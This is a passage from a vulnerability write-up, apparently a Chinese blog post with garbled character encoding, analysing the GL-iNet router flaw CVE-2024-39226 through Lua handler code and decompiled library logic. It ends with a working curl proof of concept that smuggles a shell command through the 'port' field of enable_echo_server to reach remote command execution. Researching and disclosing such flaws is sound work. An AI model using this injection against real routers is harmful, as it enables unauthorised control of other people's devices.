operator\">=</span> res<span class=\"token punctuation\">.</span>body</pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    <span class=\"token keyword\">local</span> code <span class=\"token operator\">=</span> <span class=\"token function\">tonumber</span><span class=\"token punctuation\">(</span>body<span class=\"token punctuation\">:</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(-?%d+)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token keyword\">if</span> code <span class=\"token operator\">~=</span> M<span class=\"token punctuation\">.</span>ERROR_CODE_NONE <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token keyword\">local</span> err_msg <span class=\"token operator\">=</span> body<span class=\"token punctuation\">:</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d+ (.+)\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">if</span> err_msg <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            ngx<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>ERR<span class=\"token punctuation\">,</span> err_msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token keyword\">return</span> code</pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token keyword\">local</span> msg <span class=\"token operator\">=</span> body<span class=\"token punctuation\">:</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d+ (.*)\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token keyword\">return</span> cjson<span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr></table></figure><p>æ¥ç€è·Ÿè¿› /www/cgi-bin/glc æ–‡ä»¶</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/b.png\" alt=\"b\"></p>\n<p>é€šè¿‡äº†è§£ dlopen å¯çŸ¥äº†è§£åˆ° /usr/lib/oui-httpd/rpc æ˜¯åŠ è½½åŠ¨æ€åº“çš„å‡½æ•°</p>\n<blockquote>\n<p>snprintf(s, 0x80u, â€œ%s/%<span class=\"exturl\" data-url=\"aHR0cDovL3Muc28=\">s.so</span>â€, â€œ/usr/lib/oui-httpd/rpcâ€, v30);<br>\nv10 = dlopen(s, 2);</p>\n</blockquote>\n<p>æ‰€ä»¥å¯ä»¥è¿™æ ·ç†è§£ï¼Œé€šè¿‡æˆ‘ä»¬è¾“å…¥çš„ json æ•°æ®å»è§£æï¼Œç„¶åé€šè¿‡ dlopen åŠ è½½åŠ¨æ€åº“è¿›è¡Œæ“ä½œã€‚</p>\n<p>æ‰€ä»¥é€šè¿‡ POCï¼Œä»–æ˜¯è°ƒç”¨ <code>/usr/lib/oui-httpd/rpc</code>  ç›®å½•ä¸‹çš„ s2s.so åŠ¨æ€åº“ã€‚é€šè¿‡ ida åˆ†æï¼Œæ‰¾åˆ°è¿™ä¸ª <code>enable_echo_server</code>  å‡½æ•°</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/f.png\" alt=\"f\"></p>\n<p>åœ¨å¤„ç†ç«¯å£æ—¶ï¼Œç”±äºå¯¹äºç«¯å£å¹¶æ²¡æœ‰å¾ˆä¸¥æ ¼çš„é™åˆ¶ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå‘½ä»¤æ³¨å…¥</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/e.png\" alt=\"e\"></p>\n<h3 id=\"4è¿›ä¸€æ­¥ç ”ç©¶\"><a class=\"markdownIt-Anchor\" href=\"#4è¿›ä¸€æ­¥ç ”ç©¶\">#</a> 4. è¿›ä¸€æ­¥ç ”ç©¶</h3>\n<p>é€šè¿‡ä¸Šè¿°å¯ä»¥å‘ç°ï¼Œåªèƒ½åœ¨æœ¬åœ°å®ç°å‘½ä»¤æ³¨å…¥æ‰§è¡Œçš„æ“ä½œæœ‰ç‚¹é¸¡è‚‹äº†ï¼Œè€Œé€šè¿‡ /rpc è·¯å¾„åªèƒ½å®ç°ä¸€æ¡æœ¬åœ°æ”»å‡»çš„æ“ä½œé“¾ï¼Œå¦‚æœæˆ‘ä»¬è¯ /cgi-rpc è¿™ä¸ªè·¯å¾„åº”è¯¥ä¼šæœ‰ä¸€ä¸ªæ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚æ‰€ä»¥ä¸‹é¢åˆ†æä¸€ä¸‹ /cgi-rpc è¿™æ¡è·¯å¾„ä¸‹ glc æ–‡ä»¶ï¼Œå»å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p>\n<p>é¦–å…ˆç®€å•çš„çœ‹ä¸€äº›ä¿å­˜æ¥å£çš„æ–‡ä»¶</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/c.png\" alt=\"c\"></p>\n<p>è€Œå·²ç»çŸ¥é“äº† /cgi-bin è·¯å¾„ä¸‹å­˜æ”¾ä»¥ä¸‹æ–‡ä»¶</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/d.png\" alt=\"d\"></p>\n<p>æ‰€ä»¥å½“æˆ‘ä»¬ç›´æ¥è°ƒç”¨ /cgi-bin/glcï¼Œå‘èµ·ä¸€ä¸ªå†…éƒ¨çš„ HTTP POST è¯·æ±‚ï¼Œå»å¤„ç† Json æ•°æ®ï¼Œå¹¶å»ä¼ é€’å±æ€§ï¼Œæ–¹æ³•å’Œå‚æ•°ä¿¡æ¯ï¼Œå°±æ— éœ€é™åˆ¶æœ¬åœ°æˆ–è¿œç¨‹è¯·æ±‚ã€‚</p>\n<p>æ‰€ä»¥ä¹Ÿå°±æœ‰äº†ä¸‹é¢çš„ POC</p>\n<blockquote>\n<p>curl 198.162.122.130/cgi-bin/glc -d â€˜{ â€œobjectâ€:â€œs2sâ€,  â€œmethodâ€:â€œenable_echo_serverâ€, â€œargsâ€:{â€œportâ€: â€œ7 $(touch /root/test)â€}}â€™</p>\n</blockquote>\n<blockquote>\n<p>å‚è€ƒè¿æ¥ï¼š</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzMyMjQvIzE=\">https://paper.seebug.org/3224/#1</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy55eGZ6ZWR1LmNvbS9hcnRpY2xlLzExNjAw\">http://www.yxfzedu.com/article/11600</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wZXJzb25hbC1yZWFkLmNuOjMwMDAvIy8=\">http://www.personal-read.cn:3000/#/</span></p>\n</blockquote>\n",
            "tags": [
                "IOT"
            ]
        }
    ]
}